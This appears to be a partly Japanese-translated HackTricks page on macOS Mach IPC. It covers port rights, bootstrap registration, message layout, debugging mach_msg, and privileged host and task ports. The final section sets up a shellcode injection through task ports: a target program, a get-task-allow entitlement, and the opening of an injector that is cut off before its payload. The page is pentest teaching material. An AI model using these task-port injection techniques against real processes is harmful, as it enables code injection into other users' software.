# macOS IPC - プロセス間通信

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach はリソースを共有する最小単位として **tasks** を使い、各 task は **複数の threads** を含むことができます。これらの **tasks と threads は POSIX のプロセスとスレッドに 1:1 でマッピング**されています。

task 間の通信は Mach Inter-Process Communication (IPC) を介して行われ、片方向の通信チャネルを利用します。**メッセージはポート間で転送され**、ポートはカーネルによって管理される一種の **メッセージキュー** のように振る舞います。

**port** は Mach IPC の **基本要素** です。メッセージの **送信と受信** に使用できます。

各プロセスは **IPC table** を持っており、そこにそのプロセスの **mach ports** を見つけることができます。mach port の名前は実際には数値（カーネルオブジェクトへのポインタ）です。

あるプロセスは port 名を権利と共に **別の task に送る** ことができ、カーネルはそのエントリを **他の task の IPC table** に作成します。

### Port Rights

task がどの操作を行えるかを定義する port rights はこの通信の鍵です。可能な **port rights** は次の通りです（[definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)）:

- **Receive right**, ポートに送信されたメッセージを受け取ることを許可します。Mach ports は MPSC (multiple-producer, single-consumer) キューであり、システム全体で **各ポートにつき常に1つだけの Receive right** が存在します（パイプのように複数プロセスが同じ読み取りエンドのファイルディスクリプタを持てるわけではありません）。
- RECEIVE right を持つ task はメッセージを受け取り、**Send rights を生成**してメッセージを送信できます。元々は **自身の task のみがその port に対する RECEIVE right を持つ** ことになっています。
- RECEIVE right の所有者が **死亡** したりそれを破棄すると、**send right は無効（dead name）になります。**
- **Send right**, ポートへメッセージを送ることを許可します。
- Send right は **クローン**可能であり、Send right を所有する task はその権利を複製して **第三の task に付与**できます。
- port rights は Mac メッセージを通じて **渡すこともできる** 点に注意してください。
- **Send-once right**, ポートへ1回だけメッセージを送信でき、その後消滅します。
- この権利は **クローンできません** が、**移動（move）** は可能です。
- **Port set right**, 単一のポートではなく _port set_ を示します。ポートセットからメッセージをデキューすると、そのセットに含まれるいずれかのポートからメッセージがデキューされます。Port set は複数ポートを同時に監視するのに使え、Unix の `select`/`poll`/`epoll`/`kqueue` に似ています。
- **Dead name**, 実際の port right ではなく、単なるプレースホルダです。ポートが破棄されると、そのポートへの全ての既存の port rights は dead names に変わります。

**Tasks は SEND rights を他者に転送でき**、これによりその者がメッセージを送り返すことが可能になります。**SEND rights はクローンも可能**なので、task は権利を複製して第三者に与えることができます。これと、**bootstrap server** と呼ばれる仲介プロセスを組み合わせることで、task 間の効果的な通信が実現されます。

### File Ports

File ports はファイルディスクリプタを Mac port（Mach port rights を使用）にカプセル化することを可能にします。与えられた FD から `fileport_makeport` を使って `fileport` を作成し、`fileport_makefd` を使って fileport から FD を作成することができます。

### Establishing a communication

前述のように、Mach メッセージを使って権利を送ることは可能ですが、**Mach メッセージを送る権利を既に持っていない限り、権利を送ることはできません。** では、最初の通信はどう確立するのでしょうか？

ここで **bootstrap server**（mac では **launchd**）が関与します。**誰でも bootstrap server に対する SEND right を取得できる**ため、他プロセスへの送信権利を bootstrap server に要求することが可能です。

1. Task **A** は **新しい port** を作成し、それに対する **RECEIVE right** を取得します。
2. RECEIVE right の保持者である Task **A** は、そのポートの **SEND right を生成**します。
3. Task **A** は **bootstrap server に接続**し、最初に生成したポートの **SEND right を送ります**。
- 誰でも bootstrap server に対する SEND right を取得できる点を忘れないでください。
4. Task A は `bootstrap_register` メッセージを bootstrap server に送り、与えられたポートを `com.apple.taska` のような名前に **関連付け** します。
5. Task **B** は **bootstrap server** に対してサービス名の bootstrap **lookup** を実行します（`bootstrap_lookup`）。lookup に応答するために、Task B は lookup メッセージ内で **自身が以前に作成したポートへの SEND right** を送ります。lookup が成功すると、**サーバは Task A から受け取った SEND right を複製し、Task B に渡します**。
- 誰でも bootstrap server に対する SEND right を取得できる点を忘れないでください。
6. この SEND right を使って、**Task B は Task A に対してメッセージを送信**できます。
7. 双方向通信のために通常は Task **B** が新しいポートを生成し **RECEIVE** 権と **SEND** 権を持ち、その **SEND right を Task A に渡す**ことで Task A が TASK B にメッセージを送れるようにします（双方向通信）。

bootstrap server はサービス名を主張するタスクを **認証できない** ため、ある task が例えば認可サービス名を偽って主張し、すべての要求を承認するような **なりすまし** を行う可能性があります。

そこで Apple は **システム提供サービスの名前**を SIP 保護されたディレクトリ `/System/Library/LaunchDaemons` と `/System/Library/LaunchAgents` にあるセキュアな設定ファイルに保存しています。各サービス名に対応する **バイナリも同じく保存**されています。bootstrap server はこれらのサービス名ごとに **RECEIVE right を作成して保持**します。

これらの事前定義されたサービスでは、**lookup プロセスはやや異なります**。サービス名が lookup されると、launchd はそのサービスを動的に起動します。新しいワークフローは次の通りです:

- Task **B** がサービス名の bootstrap **lookup** を開始します。
- **launchd** はそのタスクが実行中かどうかを確認し、実行していなければ **起動** します。
- Task **A**（サービス）は **bootstrap check-in**（`bootstrap_check_in()`）を実行します。ここで **bootstrap** サーバは SEND right を作成して保持し、**RECEIVE right を Task A に移譲**します。
- launchd は SEND right を複製して Task B に送ります。
- Task **B** は新しいポートを生成し **RECEIVE** 権と **SEND** 権を作り、**その SEND right を Task A（svc）に渡す**ことで Task A が TASK B にメッセージを送れるようにします（双方向通信）。

ただし、このプロセスは定義済みのシステムタスクにのみ適用されます。非システムタスクは元の方法で動作するため、なりすましが可能なままです。

> [!CAUTION]
> したがって、launchd がクラッシュするとシステム全体がクラッシュするため、launchd は決してクラッシュしてはなりません。

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

`mach_msg` 関数は実質的にシステムコールであり、Mach メッセージの送受信に使用されます。この関数は送信するメッセージを最初の引数として要求します。メッセージは `mach_msg_header_t` 構造体で始まり、その後に実際のメッセージ内容が続く必要があります。構造体は次のように定義されます:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Processes possessing a _**receive right**_ can receive messages on a Mach port. Conversely, the **senders** are granted a _**send**_ or a _**send-once right**_. The send-once right is exclusively for sending a single message, after which it becomes invalid.

The initial field **`msgh_bits`** is a bitmap:

- First bit (most significative) is used to indicate that a message is complex (more on this below)
- The 3rd and 4th are used by the kernel
- The **5 least significant bits of the 2nd byte** from can be used for **voucher**: another type of port to send key/value combinations.
- The **5 least significant bits of the 3rd byte** from can be used for **local port**
- The **5 least significant bits of the 4th byte** from can be used for **remote port**

The types that can be specified in the voucher, local and remote ports are (from [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
For example, `MACH_MSG_TYPE_MAKE_SEND_ONCE` can be used to **示す** that a **send-once** **right** should be derived and transferred for this port. It can also be specified `MACH_PORT_NULL` to prevent the recipient to be able to reply.

In order to achieve an easy **bi-directional communication** a process can specify a **mach port** in the mach **message header** called the _reply port_ (**`msgh_local_port`**) where the **receiver** of the message can **send a reply** to this message.

> [!TIP]
> この種のbi-directional communicationは、返信を期待するXPCメッセージ（`xpc_connection_send_message_with_reply` and `xpc_connection_send_message_with_reply_sync`）で使用されます。しかし、bi-directional communicationを作成するには前述の通り **通常は異なるポートが作成されます**。

The other fields of the message header are:

- `msgh_size`: パケット全体のサイズ。
- `msgh_remote_port`: このメッセージが送信されるポート。
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)。
- `msgh_id`: このメッセージのIDで、受信者によって解釈されます。

> [!CAUTION]
> 注意：**mach messages are sent over a `mach port`**。これはmachカーネルに組み込まれた **single receiver**, **multiple sender** の通信チャネルです。**Multiple processes** は mach port に **send messages** できますが、任意の時点で読み取れるのは **a single process can read** のみです。

Messages are then formed by the **`mach_msg_header_t`** header followed by the **body** and by the **trailer** (if any) and it can grant permission to reply to it. In these cases, the kernel just need to pass the message from one task to the other.

A **trailer** is **information added to the message by the kernel** (cannot be set by the user) which can be requested in message reception with the flags `MACH_RCV_TRAILER_<trailer_opt>` (there is different information that can be requested).

#### Complex Messages

However, there are other more **complex** messages, like the ones passing additional port rights or sharing memory, where the kernel also needs to send these objects to the recipient. In this cases the most significant bit of the header `msgh_bits` is set.

The possible descriptors to pass are defined in [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
In 32bits, all the descriptors are 12B and the descriptor type is in the 11th one. In 64 bits, the sizes vary.

> [!CAUTION]
> The kernel will copy the descriptors from one task to the other but first **creating a copy in kernel memory**. This technique, known as "Feng Shui" has been abused in several exploits to make the **kernel copy data in its memory** making a process send descriptors to itself. Then the process can receive the messages (the kernel will free them).
>
> It's also possible to **send port rights to a vulnerable process**, and the port rights will just appear in the process (even if he isn't handling them).

### Mac Ports APIs

Note that ports are associated to the task namespace, so to create or search for a port, the task namespace is also queried (more in `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: port を作成する。
- `mach_port_allocate` can also create a **port set**: receive right over a group of ports. Whenever a message is received it's indicated the port from where it was.
- `mach_port_allocate_name`: port の name を変更する（デフォルトは 32bit 整数）
- `mach_port_names`: ターゲットから port 名を取得する
- `mach_port_type`: name に対する task の rights を取得する
- `mach_port_rename`: port の名前を変更する（FD の dup2 のようなもの）
- `mach_port_allocate`: 新しい RECEIVE, PORT_SET or DEAD_NAME を割り当てる
- `mach_port_insert_right`: RECEIVE を持っている port に新しい right を作成する
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: mach messages を送受信するための関数。overwrite バージョンはメッセージ受信時に別のバッファを指定できる（通常版は再利用する）。

### Debug mach_msg

As the functions **`mach_msg`** and **`mach_msg_overwrite`** are the ones used to send a receive messages, setting a breakpoint on them would allow to inspect the sent a received messages.

For example start debugging any application you can debug as it will load **`libSystem.B` which will use this function**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

To get the arguments of **`mach_msg`** check the registers. These are the arguments (from [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
レジストリから値を取得する:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
最初の引数をチェックしてメッセージヘッダを検査する:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
その種の `mach_msg_bits_t` は、返信を許可するためによく使われます。

### ポートの列挙
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**name** はポートに付与されるデフォルト名です（最初の3バイトで**増加している**のを確認してください）。**`ipc-object`** はポートの**難読化された**一意の**識別子**です。\
また、**`send`** 権のみを持つポートがその所有者（ポート名 + pid）を**識別している**点にも注意してください。\
また、**`+`** が同じポートに接続された**他のタスク**を示すために使われている点にも注意してください。

SIP を無効にした状態（`com.apple.system-task-port` が必要なため）で、[**procesxp**](https://www.newosxbook.com/tools/procexp.html) を使用して**登録済みサービス名**を確認することも可能です:
```
procesp 1 ports
```
このツールはiOSに、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてインストールできます

### コード例

**sender** がポートを **allocates** し、名前 `org.darlinghq.example` の **send right** を作成して **bootstrap server** に送信する様子に注目してください。一方で、**sender** はその名前の **send right** を要求し、それを使って **send a message** を行っています。

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## 特権ポート

タスクがこれらのポートに対して**SEND**権限を持つ場合、**特定の機密操作を実行したり、特定の機密データにアクセスしたりすることができます**。このため、これらのポートは機能面だけでなく、**タスク間でSEND権限を共有できる**という点でも攻撃者にとって非常に興味深いものです。

### Host Special Ports

これらのポートは番号で表されます。

**SEND** 権利は **`host_get_special_port`** を呼ぶことで取得でき、**RECEIVE** 権利は **`host_set_special_port`** を呼ぶことで取得できます。しかし、両方の呼び出しは **`host_priv`** ポートを必要とし、これは root のみがアクセスできます。さらに、過去には root が **`host_set_special_port`** を呼び出して任意のポートをハイジャックでき、それにより例えば `HOST_KEXTD_PORT` のハイジャックでコード署名を回避することが可能でした（現在は SIP がこれを防いでいます）。

これらは2つのグループに分かれます: **最初の7ポートはカーネルが所有**しており、1 が `HOST_PORT`、2 が `HOST_PRIV_PORT`、3 が `HOST_IO_MASTER_PORT`、7 が `HOST_MAX_SPECIAL_KERNEL_PORT` です。\
番号**8**以降のものは**システムデーモンが所有**しており、[**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html) に宣言されています。

- **Host port**: プロセスがこのポートに対して**SEND**権限を持っていると、以下のようなルーチンを呼び出して**システム**に関する**情報**を取得できます:
- `host_processor_info`: プロセッサ情報を取得
- `host_info`: ホスト情報を取得
- `host_virtual_physical_table_info`: 仮想/物理ページテーブル（MACH_VMDEBUG が必要）
- `host_statistics`: ホスト統計を取得
- `mach_memory_info`: カーネルのメモリレイアウトを取得
- **Host Priv port**: このポートに対して**SEND**権を持つプロセスは、ブートデータの表示やカーネル拡張のロード試行などの**特権的な操作**を実行できます。**この権限を得るにはプロセスが root である必要があります。**
- さらに、**`kext_request`** API を呼び出すには **`com.apple.private.kext*`** のような追加の entitlements が必要で、これらは Apple のバイナリにのみ付与されます。
- 呼び出せる他のルーチン:
- `host_get_boot_info`: `machine_boot_info()` を取得
- `host_priv_statistics`: 特権統計を取得
- `vm_allocate_cpm`: 連続物理メモリを割り当てる
- `host_processors`: ホストプロセッサへのSEND権を付与する
- `mach_vm_wire`: メモリを常駐化する
- root がこの権限にアクセスできるため、`host_set_[special/exception]_port[s]` を呼び出して**host special または exception ポートをハイジャックする**ことが可能です。

次のコマンドを実行すると、**すべてのホスト特殊ポートを確認**できます：
```bash
procexp all ports | grep "HSP"
```
### タスクの特殊ポート

これらは既知のサービス用に予約されたポートです。`task_[get/set]_special_port`を呼び出すことで取得／設定できます。`task_special_ports.h`に定義されています:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
出典 [here](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html):

- **TASK_KERNEL_PORT**\[task-self send right]: このタスクを制御するために使われるポート。タスクに影響を与えるメッセージを送るために使用される。これは **mach_task_self (下のタスクポートを参照)** が返すポートである。
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: タスクの bootstrap ポート。他のシステムサービスのポート返却を要求するメッセージを送るために使用される。
- **TASK_HOST_NAME_PORT**\[host-self send right]: 包含しているホストの情報を要求するために使用されるポート。これは **mach_host_self** が返すポートである。
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: このタスクが wired カーネルメモリを引き出すソースを指すポート名。
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: このタスクがデフォルトのメモリ管理メモリを引き出すソースを指すポート名。

### タスクポート

元々 Mach には "processes" は無く "tasks" があり、これはスレッドのコンテナのようなものと見なされていました。Mach が BSD と統合された際に、**各タスクは BSD プロセスと対応付けられた**ため、すべての BSD プロセスはプロセスとして必要な情報を持ち、すべての Mach タスクも内部の動作を持つようになりました（存在しない pid 0、つまり `kernel_task` を除く）。

ここで非常に興味深い関数が二つあります:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: 指定した `pid` に関連するタスクの task port に対する SEND 権を取得し、それを指定した `target_task_port`（通常は `mach_task_self()` を使った呼び出し元タスクだが、別タスク上の SEND ポートでもありえる）に渡す。
- `pid_for_task(task, &pid)`: タスクへの SEND 権が与えられているとき、そのタスクがどの PID に関連するかを見つける。

タスク内で操作を行うために、タスクは `mach_task_self()` を呼んで自身への `SEND` 権（`task_self_trap` (28) を使用）を持つ必要がありました。この権限があればタスクは以下のような複数の操作を行えます:

- `task_threads`: タスクのスレッドのすべてのタスクポートに対する SEND 権を取得
- `task_info`: タスクに関する情報を取得
- `task_suspend/resume`: タスクを一時停止／再開
- `task_[get/set]_special_port`
- `thread_create`: スレッドを作成
- `task_[get/set]_state`: タスク状態の制御
- その他は [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h) を参照

> [!CAUTION]
> 異なるタスクの task port に対する SEND 権を持っていると、**別のタスク**に対して同様の操作を行うことが可能になる点に注意してください。

さらに、task_port は **`vm_map`** ポートでもあり、`vm_read()` や `vm_write()` のような関数でタスク内のメモリを**読み取り・操作**することを可能にします。つまり、別のタスクの task_port に対する SEND 権を持つタスクは、そのタスクに**コードを注入できる**ことを意味します。

また、**カーネルもタスクである**ため、誰かが **`kernel_task` に対する SEND 権**を取得できれば、カーネルに任意のコードを実行させることが可能になります（jailbreak 等）。

- 呼び出し元タスクのこのポートの「名前」を取得するには `mach_task_self()` を呼びます。このポートは **`exec()` を跨いでのみ継承**されます；`fork()` で作成された新しいタスクは新しいタスクポートを得ます（特殊ケースとして、suid バイナリ内での `exec()` 後にもタスクは新しいタスクポートを得ます）。タスクを生成してそのポートを取得する唯一の方法は、`fork()` の間に ["port swap dance"](https://robert.sesek.com/2014/1/changes_to_xnu_mach_ipc.html) を行うことです。
- ポートへのアクセス制限（`AppleMobileFileIntegrity` バイナリの `macos_task_policy` に基づく）:
  - アプリに **`com.apple.security.get-task-allow` entitlement** がある場合、**同一ユーザのプロセスは task port にアクセスできる**（デバッグ目的で Xcode が付与することが一般的）。ただし **notarization** は製品版リリースではこれを許可しません。
  - **`com.apple.system-task-ports`** entitlement を持つアプリはカーネルを除く**任意のプロセスの task port を取得できる**。古いバージョンでは **`task_for_pid-allow`** と呼ばれていました。これは Apple のアプリにのみ付与されます。
  - **Root は hardened runtime でコンパイルされていないアプリケーションの task ports にアクセスできる**（Apple のものを除く）。

**タスク名ポート (task name port):** _task port_ の権限の低いバージョン。タスクを参照するが制御はできない。利用可能な唯一の操作は `task_info()` のように見えます。

### スレッドポート

スレッドにも関連するポートがあり、これは **`task_threads`** を呼ぶタスクや `processor_set_threads` を使うプロセッサから見える。スレッドポートに対する SEND 権があれば、`thread_act` サブシステムの関数を使うことができ、例えば:

- `thread_terminate`
- `thread_[get/set]_state`
- `act_[get/set]_state`
- `thread_[suspend/resume]`
- `thread_info`
- ...

任意のスレッドは **`mach_thread_sef`** を呼んでこのポートを取得できます。

### Task port 経由でスレッドに対する Shellcode Injection

以下から shellcode を入手できます:


{{#ref}}
../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

{{#tabs}}
{{#tab name="mysleep.m"}}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{{#endtab}}

{{#tab name="entitlements.plist"}}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{{#endtab}}
{{#endtabs}}

前のプログラムを**コンパイル**し、同じユーザーでコードを注入できるように**entitlements**を追加してください（そうでない場合は**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
